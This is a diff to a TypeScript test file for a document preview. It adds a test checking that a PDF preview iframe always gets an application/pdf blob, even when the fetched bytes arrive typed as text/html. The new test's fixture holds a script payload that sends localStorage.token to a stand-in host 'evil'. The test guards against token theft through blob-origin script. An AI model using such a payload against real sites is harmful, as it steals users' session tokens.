@@ -42,6 +42,16 @@ function row(over: Record<string, unknown> = {}) {
   };
 }
 
+// jsdom implements neither of these. The PDF case below is entirely about
+// which blob reaches `createObjectURL`, so recording the argument is the test.
+const objectUrls: Blob[] = [];
+for (const [name, impl] of [
+  ["createObjectURL", (b: Blob) => (objectUrls.push(b), `blob:stub-${objectUrls.length}`)],
+  ["revokeObjectURL", () => {}],
+] as const) {
+  Object.defineProperty(URL, name, { value: impl, configurable: true, writable: true });
+}
+
 /** A blob whose `text()` works under jsdom regardless of its Blob support. */
 function textBlob(text: string) {
   return { blob: { text: async () => text } as unknown as Blob, contentType: "text/plain" };
@@ -148,6 +158,28 @@ describe("the document preview", () => {
       "href",
       "https://notion.so/page-1",
     );
+  });
+
+  it("frames a PDF as a PDF, whatever type the bytes arrived with", async () => {
+    // The finding, from the rendering end. A `blob:` document runs in the
+    // creating page's origin and this app's only CSP is `frame-ancestors
+    // 'none'`, so a blob that kept a `text/html` type would be a script with
+    // the session token in reach. The iframe may only ever commit the one type
+    // this branch exists for.
+    objectUrls.length = 0;
+    bytes.mockResolvedValue({
+      blob: new Blob(["<script>fetch('https://evil/?t='+localStorage.token)</script>"], {
+        type: "text/html",
+      }),
+      contentType: "text/html",
+    });
+
+    open("q3-report.pdf");
+
+    const frame = await screen.findByTitle("Document");
+    expect(frame).toHaveAttribute("src", expect.stringContaining("blob:stub"));
+    expect(objectUrls).toHaveLength(1);
+    expect(objectUrls[0].type).toBe("application/pdf");
   });
 
   it("does not ask the store for the bytes until the file tab needs them", async () => {
